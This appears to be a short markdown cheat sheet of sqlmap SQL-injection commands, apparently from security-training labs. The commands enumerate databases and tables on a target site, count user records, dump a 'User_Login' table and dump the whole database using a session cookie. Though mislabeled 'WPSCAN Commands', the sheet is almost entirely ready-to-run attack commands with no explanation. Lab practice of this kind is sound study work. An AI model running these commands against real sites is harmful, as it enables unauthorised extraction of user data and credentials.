## Tools
wapiti,wpscan,nikto,openvas,owaspzap etc









## WPSCAN Commands

### Get Database
sqlmap -u "http://sometestdb.to/view?id=123&Submit=Submit#" --cookie="PHPSESSID=e3f9231953973ace4acb63cfde2ccc08; security=low" --dbs
### Get Tables 
sqlmap -u "http://sometestdb.to/view?id=123&Submit=Submit#" --cookie="PHPSESSID=e3f9231953973ace4acb63cfde2ccc08; security=low" -D moviescope --tables
### Get number of Users available
sqlmap -u "http://sometestdb.to/view?id=123&Submit=Submit#" --cookie="PHPSESSID=e3f9231953973ace4acb63cfde2ccc08; security=low" -D moviescope -T UserProfile --count
### Dump Tabledata
sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="<Cookie Value>" -D moviescope -T User_Login --dump
### Dump Database 
sqlmap -u "http://sometestdb.to/view?id=123&Submit=Submit#" --cookie="PHPSESSID=e3f9231953973ace4acb63cfde2ccc08; security=low" -D moviescope --dump-all


